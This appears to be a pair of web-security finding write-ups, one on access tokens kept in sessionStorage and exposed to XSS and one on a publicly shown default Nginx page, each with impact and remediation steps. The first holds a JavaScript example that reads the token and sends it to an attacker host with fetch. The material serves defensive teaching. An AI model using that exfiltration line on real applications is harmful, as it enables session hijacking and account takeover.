Storing Access Tokens in sessionStorage
ğŸ“„ Description
When an application stores access tokens (e.g., JWTs) in sessionStorage, the token is accessible via JavaScript. This exposes the application to client-side attacks such as:

Cross-Site Scripting (XSS): If an attacker successfully injects malicious JavaScript into your app (via a vulnerable component, input field, or third-party script), they can read from sessionStorage and steal the access token

 Impact
Storing access tokens in localStorage or sessionStorage introduces significant risks if an attacker successfully executes a Cross-Site Scripting (XSS) attack on the application.

ğŸš¨ How an Attacker Can Exploit This
Inject Malicious JavaScript via XSS

If the application has an XSS vulnerability (e.g., unsanitized input rendered as HTML), the attacker can inject malicious scripts.

Extract Access Token

The attackerâ€™s script runs in the context of the victim's browser and can access localStorage or sessionStorage.

Example:

javascript
Copy
Edit
const token = sessionStorage.getItem("access_token");
fetch("https://attacker.com/steal?token=" + token);
Session Hijacking

The attacker uses the stolen token to authenticate as the user, gaining full access to their account and actions within the application.

Privilege Escalation or Sensitive Data Exposure

If the token belongs to an admin or privileged user, the attacker may:

Access or delete sensitive data

Modify configurations

Perform financial transactions

Compromise other users (via impersonation or downstream actions)

Persistence (in case of localStorage)

If stored in localStorage, the token persists across sessions, increasing the attack window.


ğŸ› ï¸ Remediation
âœ… 1. Prevent XSS
Use libraries like DOMPurify to sanitize user input.

Apply a strong Content Security Policy (CSP) to prevent inline scripts.

Escape output correctly in JSX and templates.

Avoid dangerouslySetInnerHTML unless absolutely necessary.

âœ… 2. Consider Using HttpOnly Cookies Instead
Store tokens in secure, HttpOnly cookies (with SameSite=Strict or Lax).

HttpOnly cookies are not accessible to JavaScript, making them resistant to XSS.

âœ… 3. Token Scope and Expiry
Issue short-lived access tokens.

Use refresh tokens securely (preferably rotated and stored in HttpOnly cookies).

âœ… 4. Token Rotation
Implement automatic access token renewal with refresh tokens on expiration.


Displaying Default Nginx Web Server Page
ğŸ“„ Description
When an application or server is misconfigured and displays the default Nginx landing page (e.g., â€œWelcome to nginx!â€), it typically indicates one of the following:

The web root directory is empty or not properly linked to the application.

The Nginx configuration is incomplete, missing a reverse proxy or upstream block.

The server is exposed publicly without a running application, making it easier for attackers to identify the server type and software version.

This is a form of information disclosure and misconfiguration, commonly categorized under CWE-200: Exposure of Sensitive Information to an Unauthorized Actor.

âš ï¸ Impact
ğŸ”“ 1. Technology Fingerprinting
Reveals that the backend is using Nginx, including possible version info.

Attackers can use this to craft targeted exploits for known vulnerabilities in that Nginx version.

ğŸ§± 2. Entry Point Enumeration
Suggests the application is misconfigured or incomplete, which may:

Reveal unused or abandoned infrastructure.

Lead attackers to directory traversal, open directory listings, or unprotected services.

ğŸ” 3. Gateway Misrouting
If the default page is returned instead of a proxy application (e.g., Node.js, PHP app, or React build), it indicates that routing or app deployment failed.

This might allow attackers to send test payloads and probe the reverse proxy or backend directly.

ğŸ› ï¸ Remediation
âœ… 1. Deploy a Proper Default Application or Redirect
Ensure the default root (/var/www/html or defined root in nginx.conf) is populated with your intended web application, not the default placeholder.

âœ… 2. Harden Nginx Configuration
Remove or replace the default server block in /etc/nginx/sites-available/default.

Disable or delete the default index.html:

bash
Copy
Edit
sudo rm /usr/share/nginx/html/index.html
âœ… 3. Set Up a Custom 404 or Maintenance Page
Prevent the Nginx default from ever being exposed, even when the app fails.

âœ… 4. Restrict Unused Ports and Virtual Hosts
Donâ€™t leave Nginx listening on open ports with default behavior (e.g., 80 or 8080) unless intentionally exposed.

ğŸ§ª Bonus: Detection Tips


